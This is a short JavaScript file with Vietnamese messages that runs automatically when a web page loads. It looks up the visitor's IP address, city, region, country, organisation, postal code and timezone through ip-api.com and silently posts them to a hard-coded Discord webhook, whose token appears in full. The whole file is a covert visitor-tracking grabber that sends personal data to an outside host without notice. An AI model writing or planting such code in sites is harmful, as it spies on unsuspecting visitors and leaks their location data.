document.addEventListener('DOMContentLoaded', function() {

    const webhookURL = 'https://discord.com/api/webhooks/1096640171140726876/Hg6SMNMWs3xJ1tTFyY_KBu5wZmUw8yqrwYSoIz_trv9VAhqsOCQh0vdgo_gleFfyGEgd';

    // Specify the IP address you want to query
    fetch(`http://ip-api.com/json`)
        .then(response => response.json())
        .then(data => {
            const {
                ip,
                city,
                region,
                country,
                loc,
                org,
                postal,
                timezone
            } = data;
            const requestData = {
                content: `Thông tin của người truy cập:
IP: ${ip}
Thành phố: ${city}
Khu vực: ${region}
Quốc gia: ${country}
Vị trí: ${loc}
Tổ chức: ${org}
Mã bưu điện: ${postal}
Múi giờ: ${timezone}`
            };            

            fetch(webhookURL, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(requestData),
            })
            .then(response => {
                if (!response.ok) {
                    console.error('Gửi thông tin không thành công');
                }
            })
            .catch(error => {
                console.error('Lỗi kết nối:', error);
            });
        })
        .catch(error => {
            console.error('Lấy địa chỉ IP không thành công:', error);
        });
});
